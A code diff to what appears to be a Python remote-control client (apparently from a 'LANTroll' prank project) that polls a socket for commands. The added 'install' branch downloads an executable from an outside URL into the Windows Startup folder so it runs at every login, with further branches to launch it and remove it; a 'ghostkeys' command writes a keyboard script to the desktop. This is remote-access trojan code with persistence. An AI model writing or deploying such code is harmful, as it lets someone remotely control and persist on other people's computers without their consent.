@@ -13,7 +13,8 @@ while True:
         time.sleep(3)
         continue
     command1 = command.split(" ",1)
-
+    path = os.environ["HOMEPATH"]
+    print(path)
     if "ghostkeys" in str(command1[0]):
         path = os.environ["HOMEPATH"]
         finalpathk = "C:"+path+"\Desktop\\keyboard.vbs"
@@ -154,15 +155,29 @@ loop
         print("Done")
 
     elif "install" in str(command1[0]):
-        path = os.environ["HOMEPATH"]
-        finalpatht = "C:"+path+"\Desktop\\tcaps.vbs"
-        url = 'http://www.blog.pythonlibrary.org/wp-content/uploads/2012/06/wxDbViewer.zip'
-        #C:\Users\kress\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+        downloadlocation = "C:"+path+"\AppData\\Roaming\\Microsoft\Windows\Start Menu\Programs\Startup\minion.exe"
+        url = 'https://rawgit.com/kres0345/LANTroll/master/commander/minion.exe'
         print("Installing")
-        #Insert requests install command here
+        urllib.urlretrieve(url, downloadlocation)
+        print("Done")
 
+    elif "uninstall" in str(command1[0]):
+        downloadlocation = "C:"+path+"\AppData\\Roaming\\Microsoft\Windows\Start Menu\Programs\Startup\minion.exe"
+        try:
+            os.remove(downloadlocation)
+            print("Uninstalled successfully")
+        except:
+            print("File not found")
+            pass
 
-
+    elif "restart" in str(command1[0]):
+        downloadlocation = "C:"+path+"\AppData\\Roaming\\Microsoft\Windows\Start Menu\Programs\Startup\minion.exe"
+        print("Restarting Minion")
+        try:
+            os.startfile(downloadlocation)
+            sys.exit()
+        except:
+            print("Not restarting becouse minion isnt installed in startup folder")
 
     time.sleep(10)
     s.close()
